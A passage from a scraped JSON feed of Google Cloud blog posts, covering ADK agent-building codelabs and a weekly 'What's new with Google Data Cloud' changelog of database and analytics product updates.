rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">ADK</span></a><span style=\"vertical-align: baseline;\"> by guiding you through the construction of a </span><strong style=\"vertical-align: baseline;\">personal assistant agent</strong><span style=\"vertical-align: baseline;\">.</span></p>\n<p><span style=\"vertical-align: baseline;\">You will write the code for the agent itself and will interact </span><span style=\"vertical-align: baseline;\">directly with the agent's core reasoning engine, powered by </span><a href=\"https://ai.google.dev/gemini-api/docs/models?utm_campaign=CDR_0x6e136736_default_b456239055&amp;utm_medium=external&amp;utm_source=blog\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Gemini</span></a><span style=\"vertical-align: baseline;\">, to see how it responds to a simple request. This lab is focused on building the fundamental scaffolding of every agent you'll create.</span></p></div>\n<div class=\"block-aside\"><dl>\n    <dt>aside_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;title&#x27;, &#x27;Go to the lab!&#x27;), (&#x27;body&#x27;, &lt;wagtail.rich_text.RichText object at 0x7f91898ce160&gt;), (&#x27;btn_text&#x27;, &#x27;&#x27;), (&#x27;href&#x27;, &#x27;&#x27;), (&#x27;image&#x27;, None)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><h2><span style=\"vertical-align: baseline;\">Empower your agent with tools</span></h2>\n<p><span style=\"vertical-align: baseline;\">An agent without custom tools can only rely on its built-in knowledge. To make it more powerful for your specific use-case, you can give it access to specialized tools. In this lab, you will learn three different ways to add tools:</span></p>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">Build a Custom Tool:</strong><span style=\"vertical-align: baseline;\"> Write a currency exchange tool from scratch.</span></li>\n<li><strong style=\"vertical-align: baseline;\">Integrate a Built-in Tool:</strong><span style=\"vertical-align: baseline;\"> Add </span><a href=\"https://github.com/google/adk-python\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">ADK</span></a><span style=\"vertical-align: baseline;\">'s pre-built </span><a href=\"https://google.github.io/adk-docs/tools/built-in-tools/#google-search\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Search tool.</span></a></li>\n<li><strong style=\"vertical-align: baseline;\">Leverage a Third-Party Tool:</strong><span style=\"vertical-align: baseline;\"> Import and use a </span><a href=\"https://docs.langchain.com/oss/javascript/integrations/tools/wikipedia\" rel=\"noopener\" target=\"_blank\">Wikipedia tool</a> <span style=\"vertical-align: baseline;\">from the LangChain library.</span></li>\n</ul></div>\n<div class=\"block-aside\"><dl>\n    <dt>aside_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;title&#x27;, &#x27;Go to the lab!&#x27;), (&#x27;body&#x27;, &lt;wagtail.rich_text.RichText object at 0x7f91898ce5e0&gt;), (&#x27;btn_text&#x27;, &#x27;&#x27;), (&#x27;href&#x27;, &#x27;&#x27;), (&#x27;image&#x27;, None)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><h2><span style=\"vertical-align: baseline;\">Build a Team of Specialized Agents</span></h2>\n<p><span style=\"vertical-align: baseline;\">When a task is too complex for a single agent, you can build out a multi-agent team. This lab goes deep into the power of </span><a href=\"https://cloud.google.com/discover/what-is-a-multi-agent-system?e=48754805&amp;utm_campaign=CDR_0x6e136736_default_b456239055&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">multi-agent systems</span></a><span style=\"vertical-align: baseline;\"> by having you build a \"movie pitch development team\" that can research, write, and analyze a film concept.</span></p>\n<p><span style=\"vertical-align: baseline;\">You will learn how to use </span><a href=\"https://google.github.io/adk-docs/agents/workflow-agents/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">ADK's Workflow Agents</span></a><span style=\"vertical-align: baseline;\"> to control the flow of work automatically, without needing user input at every step. You'll also learn how to use the session state to pass information between the agents.</span></p></div>\n<div class=\"block-aside\"><dl>\n    <dt>aside_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;title&#x27;, &#x27;Go to the lab!&#x27;), (&#x27;body&#x27;, &lt;wagtail.rich_text.RichText object at 0x7f91898cee50&gt;), (&#x27;btn_text&#x27;, &#x27;&#x27;), (&#x27;href&#x27;, &#x27;&#x27;), (&#x27;image&#x27;, None)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><h2><span style=\"vertical-align: baseline;\">Summary: Build Your First AI Teammate Today</span></h2>\n<p><span style=\"vertical-align: baseline;\">Ready to build your first </span><a href=\"https://cloud.google.com/discover/what-are-ai-agents?e=48754805&amp;utm_campaign=CDR_0x6e136736_default_b456239055&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">AI agents</span></a><span style=\"vertical-align: baseline;\">? </span><span style=\"vertical-align: baseline;\">Dive into the codelabs from this post:</span></p>\n<ul>\n<li><a href=\"https://codelabs.developers.google.com/devsite/codelabs/build-agents-with-adk-foundation?hl=en#0&amp;utm_campaign=CDR_0x6e136736_default_b456239055&amp;utm_medium=external&amp;utm_source=blog\" rel=\"noopener\" target=\"_blank\">Building AI Agents with ADK: The Foundation</a></li>\n<li><a href=\"https://codelabs.developers.google.com/devsite/codelabs/build-agents-with-adk-empowering-with-tools?hl=en\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Empower ADK Agents with Tools</span></a></li>\n<li><a href=\"https://codelabs.developers.google.com/codelabs/production-ready-ai-with-gc/3-developing-agents/build-a-multi-agent-system-with-adk?hl=en#0\" rel=\"noopener\" target=\"_blank\"><span style=\"vertical-align: baseline;\">Build Multi-Agent Systems with ADK</span></a></li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">Share your progress and connect with others on the journey using the hashtag </span><strong style=\"vertical-align: baseline;\">#ProductionReadyAI</strong><span style=\"vertical-align: baseline;\">. Happy learning!\u00a0</span></p></div>",
        "published_date": "2025-11-07 09:49:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/data-analytics/whats-new-with-google-data-cloud/",
        "title": "What\u2019s new with Google Data Cloud",
        "thumbnail": "https://storage.googleapis.com/gweb-cloudblog-publish/original_images/whats_new_data_cloud_fWg4bKK.png",
        "author": "The Google Cloud Data Analytics, BI, and Database teams",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">November 3 - November 7\u00a0</span></h3>\n<ul>\n<li><span style=\"vertical-align: baseline;\">We have announced the</span><strong style=\"vertical-align: baseline;\"> </strong><a href=\"https://medium.com/google-cloud/spanner-better-with-bigquery-streaming-insights-faster-federated-queries-with-iceberg-and-04e1299dd831\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">next generation of Spanner-better-with-BigQuery capabilities</strong></a><span style=\"vertical-align: baseline;\"> delivering streaming insights, faster federated queries, cross-region data operations across Spanner and BigQuery data including Iceberg tables.</span></li>\n<li><a href=\"https://cloud.google.com/sql/docs/postgres/manage-memory-usage-best-practices#cancelled-query\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Memory Agent for Cloud SQL for PostgreSQL</strong></a><strong style=\"vertical-align: baseline;\"> </strong><span style=\"vertical-align: baseline;\">is now generally available. Previously, memory-intensive queries could cause PostgreSQL restarts due to the Linux OOM killer. This led to downtime and no clear way for users to identify problematic queries. The new Memory Agent proactively detects and gracefully cancels high-memory connections, preventing restarts. With a recommender, it offers details and suggestions to alleviate memory pressure, providing a better user experience.</span></li>\n<li><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">We're excited to announce the General Availability of </span><a href=\"https://docs.cloud.google.com/sql/docs/sqlserver/cmad\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Customer-managed Active Directory integration</span></a><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">with Cloud SQL for SQL Server. This allows Windows authentication for Cloud SQL for SQL Server instances using existing AD environments, eliminating the need for Google Managed AD and simplifying critical SQL Server workloads.</span></span></span></span></li>\n</ul>\n<h3><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">October 24 - October 31</span></span></span></h3>\n<ul>\n<li><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">Dive into the newest Google Cloud Tech Bytes videos for </span><a href=\"https://www.youtube.com/watch?v=NGkO5YMQctU&amp;t=2s\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Cloud SQL</span></a><span style=\"vertical-align: baseline;\"> and </span><a href=\"https://www.youtube.com/watch?v=RunwI3gYLAE\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Spanner</span></a><span style=\"vertical-align: baseline;\">! Get the practical details you need to set up and optimize our fully managed databases so you can simplify operations and accelerate development.</span></span></span></span></li>\n</ul>\n<h3><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">October 20 - October 24</span></span></h3>\n<ul>\n<li><a href=\"https://cloud.google.com/database-migration\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Database Migration Service</span></a><span style=\"vertical-align: baseline;\"> now offers Object Level Observability, providing enhanced visibility and control over data migration. Previously limited to job-level oversight, these capabilities have been expanded to the individual table level, allowing for detailed insight into your data movement while heterogeneous database migration (e.g SQL Server to PostgreSQL).</span></li>\n<li><span style=\"vertical-align: baseline;\">Cloud SQL's Enterprise Plus edition now supports the </span><a href=\"https://cloud.google.com/blog/products/compute/try-c4a-the-first-google-axion-processor\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Axion</span><span style=\"text-decoration: underline; vertical-align: baseline;\">-based C4A machine series</span></a><span style=\"vertical-align: baseline;\"> in GA. This offers our customers significant performance benefits: nearly</span><strong style=\"vertical-align: baseline;\"> 50% better price-performance </strong><span style=\"vertical-align: baseline;\">compared to current N2 machines and up to</span><strong style=\"vertical-align: baseline;\"> 2x greater transactional throughput</strong><span style=\"vertical-align: baseline;\"> than Amazon RDS Graviton 4-based offerings.</span></li>\n<li><span style=\"vertical-align: baseline;\">Firestore with Enterprise Edition now offers </span><a href=\"https://cloud.google.com/firestore/mongodb-compatibility/docs/saved-queries\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Saved Queries</span></a><span style=\"vertical-align: baseline;\">.This new feature enables users to save and share queries for a specific database directly from the Firestore Studio page.</span></li>\n<li><span style=\"vertical-align: baseline;\">At Oracle AI World \u201825, </span><a href=\"https://cloud.google.com/products/gemini/databases\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Database Center</span></a><span style=\"vertical-align: baseline;\"> announced expanded support for Oracle Database@Google Cloud. This update allows customers to monitor Oracle Exadata and Autonomous databases, including their inventory and metrics, directly within the Database Center UI and Chat. Now, Google Cloud database services and Oracle inventory can be monitored side-by-side.</span></li>\n<li><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">Managed Kafka Connect is now generally available. Replicate on-prem clusters to Managed Service for Apache Kafka clusters, surface Kafka data in BigQuery, backup the data in Cloud Storage, or activate it in Pub/Sub. Unlock the real value of your Kafka data. </span><a href=\"https://cloud.google.com/managed-service-for-apache-kafka/docs/connect-cluster/kafka-connect-write-to-bigquery\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Get started with Kafka Connect today</span></a><span style=\"vertical-align: baseline;\">.</span></span></span></li>\n<li><strong style=\"vertical-align: baseline;\"><strong style=\"vertical-align: baseline;\">October 13 - October 17</strong></strong></li>\n<li><span style=\"vertical-align: baseline;\">Don't miss the </span><a href=\"https://cloudonair.withgoogle.com/events/databases-innovation-roadmap-2025\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Database Innovation Roadmap Webinar</strong></a><span style=\"vertical-align: baseline;\"> on </span><strong style=\"vertical-align: baseline;\">October 30th</strong><span style=\"vertical-align: baseline;\">, where we'll reveal the strategies and roadmap to supercharge </span><strong style=\"vertical-align: baseline;\">agentic development</strong><span style=\"vertical-align: baseline;\"> and the next wave of </span><strong style=\"vertical-align: baseline;\">AI innovation</strong><span style=\"vertical-align: baseline;\">. This event kicks off our new </span><strong style=\"vertical-align: baseline;\">Database Innovation Series</strong><span style=\"vertical-align: baseline;\">, granting you access to 5+ deep-dive sessions shortly after the main event!</span></li>\n</ul>\n<h3><strong style=\"vertical-align: baseline;\">October 6 - October 10</strong></h3>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Cloud SQL now offers </span><a href=\"https://cloud.google.com/sql/docs/mysql/backup-recovery/restore#deleted-instance\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">point-in-time recovery (PITR) for deleted instances</strong></a><span style=\"vertical-align: baseline;\">, addressing compliance, accidental deletion, and disaster recovery needs. This feature requires customers to enable backup retention and PITR on their instances. Users can utilize the existing</span><a href=\"https://cloud.google.com/sql/docs/mysql/backup-recovery/pitr#perform-pitr-deleted-instance\"><span style=\"text-decoration: underline; vertical-align: baseline;\"> PITR clone API</span></a><span style=\"vertical-align: baseline;\"> (with source-instance-deletion-time) and</span><a href=\"https://cloud.google.com/sql/docs/mysql/backup-recovery/pitr#get-the-latest-recovery-time\"><span style=\"text-decoration: underline; vertical-align: baseline;\"> getLatestRecoveryTime API</span></a><span style=\"vertical-align: baseline;\"> to manage deleted instances. The PITR window shortens based on log retention: up to 35 days for Enterprise Plus instances and 7 days for Enterprise instances.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Introducing the</span><strong style=\"vertical-align: baseline;\"> </strong><a href=\"https://cloud.google.com/sql/docs/postgres/upgrade-major-db-version-inplace#precheck\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Precheck API for Cloud SQL for PostgreSQL</strong></a><span style=\"vertical-align: baseline;\">. This new feature improves Major Version Upgrades by proactively identifying potential issues, preventing unplanned downtime caused by instance incompatibilities (extensions, flags, data types). It addresses customer requests for a precheck utility to identify and remedy upgrade issues beforehand.</span></p>\n</li>\n<li><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">AlloyDB now supports the</span><span style=\"vertical-align: baseline;\"> </span><a href=\"https://github.com/tds-fdw/tds_fdw\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">tds_fdw extension</span></a><span style=\"vertical-align: baseline;\">, enabling direct access to SQL Server and Sybase databases. This feature streamlines database migrations and allows hybrid data analysis, complementing existing oracle_fdw support.</span></span></li>\n</ul>\n<h3><strong style=\"vertical-align: baseline;\">September 29 - October 3</strong></h3>\n<p><strong style=\"vertical-align: baseline;\">Cloud SQL announced support for </strong><a href=\"https://cloud.google.com/sql/docs/mysql/managed-connection-pooling\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Managed Connection Pool</strong></a><strong style=\"vertical-align: baseline;\"> (in GA) across MySQL and PostgreSQL</strong></p>\n<ul>\n<li>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Managed Connection Pooling lets you scale your workloads by optimizing resource utilization for Cloud SQL instances using pooling. You can now also use </span><a href=\"https://cloud.google.com/sql/docs/postgres/iam-authentication\"><span style=\"text-decoration: underline; vertical-align: baseline;\">IAM authentication</span></a><span style=\"vertical-align: baseline;\"> to secure connections when using Managed Connection Pooling. To understand how it works, its key benefits, and how to configure Managed Connection Pooling for your workloads, dive into these guides:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\"><strong>MySQL:</strong> <a href=\"https://discuss.google.dev/t/boost-your-cloud-sql-for-mysql-performance-through-managed-connection-pooling/269283\" rel=\"noopener\" target=\"_blank\">https://discuss.google.dev/t/boost-your-cloud-sql-for-mysql-performance-through-managed-connection-pooling/269283</a></span></li>\n<li style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\"><strong>PostgreSQL:</strong> <a href=\"https://discuss.google.dev/t/optimizing-performance-and-scaling-with-managed-connection-pooling-for-cloud-sql-for-postgresql/270528?u=sagarsidhpura\" rel=\"noopener\" target=\"_blank\">https://discuss.google.dev/t/optimizing-performance-and-scaling-with-managed-connection-pooling-for-cloud-sql-for-postgresql/270528?u=sagarsidhpura</a>\u00a0</span></li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h3><strong style=\"vertical-align: baseline;\">September 22 - September 26</strong></h3>\n<p><a href=\"https://cloud.google.com/alloydb/docs/release-notes\"><span style=\"text-decoration: underline; vertical-align: baseline;\"><strong>AlloyDB now supports PostgreSQL 17 in GA</strong></span></a></p>\n<p><span style=\"vertical-align: baseline;\">AlloyDB now offers general availability for PostgreSQL 17, bringing with it a range of new features and significant enhancements. Key improvements include:</span></p>\n<ul>\n<li><span style=\"vertical-align: baseline;\">Improved query performance, particularly for materialized Common Table Expressions</span></li>\n<li><span style=\"vertical-align: baseline;\">Incremental backup capabilities</span></li>\n<li><span style=\"vertical-align: baseline;\">Enhanced logical replication features</span></li>\n<li><span style=\"vertical-align: baseline;\">Improvements to the JSON data type handling</span></li>\n</ul>\n<p><strong><a href=\"https://storage.googleapis.com/cloud-training/CLS_LIVE_DataSheets/Live_Data_Sheets/English/T-AIATDB-A%20_DS_EN.pdf\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Build AI Agents with Enterprise Databases</span></a><span style=\"vertical-align: baseline;\"> (NEW! Training Course)</span></strong></p>\n<p><span style=\"vertical-align: baseline;\">This on-demand course teaches how to build AI agents that can leverage our enterprise databases using MCP Toolbox for Databases, as a secure middle layer. You will learn to securely connect AI agents to your existing databases like AlloyDB, Cloud SQL, and Spanner. You can define secure database interaction tools and implement intelligent querying capabilities, including semantic search with vector embeddings.</span></p>\n<p><strong style=\"vertical-align: baseline;\">Gemini CLI extensions for Data Cloud services and popular open source databases released</strong></p>\n<p><span style=\"vertical-align: baseline;\">In June, Google launched the </span><a href=\"https://blog.google/technology/developers/introducing-gemini-cli-open-source-ai-agent/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">open-source Gemini CLI</span></a><span style=\"vertical-align: baseline;\">. Now, developers can leverage open-source Gemini CLI extensions for Google Data Cloud services such as Cloud SQL, AlloyDB, and BigQuery. These extensions streamline data interactions and enhance application development directly from their local environment. For more details, check out the </span><a href=\"https://github.com/google-gemini/gemini-cli/blob/main/docs/extension.md\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">extensions documentation</span></a><span style=\"vertical-align: baseline;\">. You can also explore existing templates to begin creating and sharing your own extensions with the community.</span></p>\n<p><strong><span>Cloud SQL for PostgreSQL now supports the </span></strong><a href=\"https://github.com/ChenHuajun/pg_roaringbitmap\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\"><strong>pg_roaringbitmap extension</strong></span></a></p>\n<p><span style=\"vertical-align: baseline;\">Cloud SQL developers will now benefit from the ability to handle high-scale analytics, complex filtering, and large set operations directly within the managed PostgreSQL environment with unprecedented speed and efficiency.</span></p>\n<h3><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">September 15 - September 19</span></span></span></h3>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">Benchmark-Driven Kafka Optimization: Maximize Throughput and Cut Costs on Google Cloud</strong>\n<ul>\n<li>Choosing the right compression strategy for Google Cloud Managed Service for Kafka is one of the most critical decisions impacting your performance and budget\u2014and many are leaving massive savings on the table. Relying on default settings or guesswork can lead to unnecessarily high network and storage costs, increased latency, and severe throughput bottlenecks. This new, in-depth guide moves beyond theory to provide hard benchmark data, empowering you to make data-driven decisions.This comprehensive analysis systematically tests the most popular codecs (including GZIP, SNAPPY, and LZ4) against a \"no compression\" baseline. <br /><br /><a href=\"https://discuss.google.dev/t/a-guide-to-compression-benchmarking-and-scaling-for-google-cloud-managed-service-for-kafka/263950\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Read the full guide and get the sample benchmark code here.</span></a></li>\n</ul>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Explore and experiment with Spanner's advanced capabilities with ease.</strong> <a href=\"https://www.youtube.com/shorts/YPCoS0akj6I\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Say goodbye to friction and hello to innovation</strong></a><strong style=\"text-decoration: underline; vertical-align: baseline;\">.</strong></p>\n<ul>\n<li><a href=\"https://cloud.google.com/spanner/docs/free-trial-instance?utm_campaign=CDR_0x6cb6c9c7_platform_b439579335&amp;utm_medium=external&amp;utm_source=social\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Free 90-day trial</span></a></li>\n<li><a href=\"https://github.com/GoogleCloudPlatform/cloud-spanner-samples/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Pre-loaded datasets</span></a> <span style=\"vertical-align: baseline;\">for retail, banking, finance, and more</span></li>\n<li><span style=\"vertical-align: baseline;\">Easy data import from MySQL, PostgreSQL dump files, and CSV</span></li>\n<li><span style=\"vertical-align: baseline;\">Dozens of sample queries showcasing advanced features like full-text search, vector search, and graph capabilities</span></li>\n</ul>\n</li>\n<li><span style=\"vertical-align: baseline;\"><a href=\"https://cloud.google.com/blog/products/databases/c4a-axion-processors-for-alloydb-now-ga?e=48754805\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">C4A Axion processor support is now in GA for AlloyDB</strong></a></span>\n<ul>\n<li><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">It was launched in Preview during Next'25. Customers waiting for GA to evaluate / onboard for production can now get better performance, price-performance and can run their development environment with 50% reduced entry price using one vCPU. </span><span style=\"vertical-align: baseline;\">Ready to get started? If you\u2019re new to AlloyDB, You can sign-up via the</span><span style=\"vertical-align: baseline;\"> </span><a href=\"https://goo.gle/try_alloydb\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">AlloyDB free trial link</span></a><span style=\"vertical-align: baseline;\">.</span></span></li>\n</ul>\n</li>\n<li><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\"><a href=\"https://cloud.google.com/alloydb/docs/parameterized-secure-views-overview\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Parameterized Secured Views</strong></a><strong style=\"vertical-align: baseline;\"> (now in Preview) in AlloyDB</strong><span style=\"vertical-align: baseline;\"> provides application data security and row access control using SQL views.</span></span></span></li>\n</ul>\n<h3><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">September 8 - September 12</span></span></span></h3>\n<ul>\n<li><a href=\"https://cloud.google.com/blog/topics/retail/from-query-to-cart-inside-targets-search-bar-overhaul-with-alloydb-ai\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">From query to cart: Inside Target\u2019s search bar overhaul with AlloyDB AI</strong><span style=\"vertical-align: baseline;\">\u00a0</span></a>\n<ul>\n<li><span style=\"vertical-align: baseline;\">Target set out to modernize its digital search experience to better match guest expectations and support more intuitive discovery across millions of products. To meet that challenge, they rebuilt their platform with hybrid search powered by filtered vector queries and</span> <a href=\"https://cloud.google.com/alloydb/ai\"><span style=\"text-decoration: underline; vertical-align: baseline;\">AlloyDB AI</span></a><span style=\"vertical-align: baseline;\">. Target achieved faster, smarter, more resilient search experience that\u2019s already improved product discovery relevance by 20% and delivered measurable gains in performance and guest satisfaction.</span></li>\n</ul>\n</li>\n<li><a href=\"https://cloud.google.com/customers/schibsted?hl=en&amp;e=48754805\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Powering smarter recommendations with Bigtable and BigQuery</strong></a>\n<ul>\n<li><span style=\"vertical-align: baseline;\">Schibsted Marketplaces, a leading online classifieds group in the Nordic region, cut infrastructure costs by 70% and accelerated data insights and model development by adopting Bigtable and BigQuery. This led to faster, more relevant recommendations and a better user experience.</span></li>\n</ul>\n</li>\n<li><a href=\"https://cloud.google.com/alloydb/docs/ai/natural-language-overview\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">AlloyDB AI natural language</strong></a><strong style=\"vertical-align: baseline;\"> support launched in Public Preview</strong>\n<ul>\n<li><span style=\"vertical-align: baseline;\">AlloyDB now simplifies the process for enterprises to develop highly accurate and secure Gen AI applications. These applications enable end-users to interact with their own data using natural language. The </span><a href=\"https://cloud.google.com/alloydb/docs/ai/generate-sql-queries-natural-language\"><span style=\"text-decoration: underline; vertical-align: baseline;\">new natural language APIs</span></a><span style=\"vertical-align: baseline;\"> integrate seamlessly into agentic architectures and are compatible with Gen AI orchestration frameworks like LangChain, making real-time operational data more accessible for end-user-facing chat experiences.</span></li>\n</ul>\n</li>\n<li><strong style=\"vertical-align: baseline;\">Cloud SQL announced support for the </strong><a href=\"https://cloud.google.com/sql/docs/mysql/about-read-pools\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Read Pools</strong></a><strong style=\"vertical-align: baseline;\"> (in GA) across MySQL and PostgreSQL</strong>\n<ul>\n<li><span style=\"vertical-align: baseline;\">Cloud SQL's read pools offer a significant advantage over self-managed databases, particularly for read-heavy workloads. They simplify operations and enhance scalability by providing a single endpoint for up to 20 read pool nodes, automatically balancing traffic among them. Read pools can also be dynamically scaled up, down, out, or in to accommodate traffic surges.</span></li>\n</ul>\n</li>\n</ul>\n<h3><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">August 25 - August 29</span></span></h3>\n<ul>\n<li><a href=\"https://cloud.google.com/blog/products/databases/firestore-with-mongodb-compatibility-is-now-ga\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Firestore with MongoDB compatibility is now generally available (GA)</strong></a><strong style=\"vertical-align: baseline;\">\u00a0</strong>\n<ul>\n<li><span style=\"vertical-align: baseline;\">Developers can now build cost-effective, scalable, and highly reliable apps on Firestore's serverless database using a familiar MongoDB-compatible API. With the general availability of Firestore with MongoDB compatibility, the 600,000 active developers within the Firestore community can now use existing MongoDB application code, drivers, and tools, as well as the open-source MongoDB ecosystem, with Firestore's serverless service. Firestore offers benefits like multi-region replication, virtually unlimited scalability, up to 99.999% SLA, single-digit millisecond read performance, integrated Google Cloud governance, and pay-as-you-go pricing.\u00a0</span></li>\n<li><a href=\"https://cloudonair.withgoogle.com/events/firestore-compatibility-in-action?utm_source=twitter&amp;utm_medium=unpaidsoc&amp;utm_campaign=fy25q3-googlecloudtech-web-data-in_feed-no-brand-global&amp;utm_content=-&amp;utm_term=-&amp;linkId=16456513\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Register now</strong><span style=\"text-decoration: underline; vertical-align: baseline;\"> </span></a><span style=\"vertical-align: baseline;\">for an exciting\u00a0 webinar on September 9th for a deep dive into Firestore with MongoDB compatibility and see live demos.\u00a0</span></li>\n</ul>\n</li>\n<li><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\"><a href=\"https://cloud.google.com/database-migration?e=48754805&amp;hl=en\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Database Migration Service (DMS)</span></a><span style=\"vertical-align: baseline;\"> offers support for </span><a href=\"https://cloud.google.com/vpc/docs/private-service-connect\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Private Service Connect (PSC) interfaces</span></a><span style=\"vertical-align: baseline;\"> for homogenous migrations to Cloud SQL (</span><a href=\"https://cloud.google.com/database-migration/docs/postgres/configure-connectivity-vpc-peering#psc-interfaces\"><span style=\"text-decoration: underline; vertical-align: baseline;\">PSCi support doc</span></a><span style=\"vertical-align: baseline;\">)\u00a0 and AlloyDB (</span><a href=\"https://cloud.google.com/database-migration/docs/postgres/configure-connectivity-vpc-peering#psc-interfaces\"><span style=\"text-decoration: underline; vertical-align: baseline;\">PSCi support doc</span></a><span style=\"vertical-align: baseline;\">). This capability is now generally available (GA). </span></span></span></li>\n</ul>\n<h3><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">August 18 - August 22</span></span></h3>\n<ul>\n<li><strong><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">Simplify Data Ingestion with the Revamped BigQuery \"Add Data\" Experience</span></span></strong>\n<ul>\n<li><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">We're excited to announce the general availability of a completely redesigned \"Add Data\" experience in BigQuery, built to streamline how you bring data in for analysis.</span></span></li>\n<li><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">To enhance the user journey, we focused on simplifying the process of choosing from the many powerful ingestion methods BigQuery supports, from batch and streaming to CDC. Our goal was to create a more intuitive path for discovering data sources and provide clearer guidance on selecting the right tool for any given task.</span></span></li>\n<li><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">The new \"Add Data\" experience achieves this with a single, unified starting point within BigQuery Studio. It brings together all the ways to get data into BigQuery\u2014including Data Transfer Service, Datastream, Dataflow, and partner solutions\u2014into one intuitive interface. The experience guides you with clear categorization, solution recommendations, and in-context documentation to help you make informed choices. Now you can easily discover and configure the right data pipeline for your needs without leaving the BigQuery console.</span></span></li>\n<li><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">Get started by clicking the <strong>\"+ Add data\"</strong> button in the BigQuery Explorer pane today. <a 